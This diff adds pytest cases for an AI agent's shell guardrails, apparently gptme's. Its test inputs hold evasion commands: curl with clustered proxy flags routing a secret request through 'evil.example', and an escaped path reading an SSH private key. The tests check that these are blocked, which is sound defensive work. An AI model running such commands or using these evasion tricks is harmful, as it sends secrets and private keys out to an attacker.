@@ -276,6 +276,14 @@ class TestEgressAllowlist:
         assert result is not None
         assert "proxy.example" in result
 
+    def test_curl_proxy_clustered_short_blocked(self):
+        result = _check_egress(
+            "curl -vvxhttp://evil.example:8080 https://api.openai.com/secret",
+            allowlist=["api.openai.com"],
+        )
+        assert result is not None
+        assert "evil.example" in result
+
     def test_curl_proxy_long_blocked(self):
         result = _check_egress(
             "curl --proxy https://proxy.example:8080 https://api.openai.com/secret",
@@ -500,6 +508,24 @@ class TestGuardrailsHook:
             "shell",
             "curl -x https://proxy.example:8080 https://api.openai.com/secret",
         )
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_clustered_curl_proxy(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        monkeypatch.setenv("GPTME_EGRESS_ALLOWLIST", "api.openai.com")
+        tu = self._tool_use(
+            "shell",
+            "curl -vvxhttp://evil.example:8080 https://api.openai.com/secret",
+        )
+        result = guardrails_hook(tu)
+        assert isinstance(result, ConfirmationResult)
+        assert result.action == ConfirmAction.SKIP
+
+    def test_enforce_blocks_escaped_secret_path(self, monkeypatch):
+        monkeypatch.setenv("GPTME_GUARDRAILS", "enforce")
+        tu = self._tool_use("shell", r"cat ~/.ss\h/id_rsa")
         result = guardrails_hook(tu)
         assert isinstance(result, ConfirmationResult)
         assert result.action == ConfirmAction.SKIP
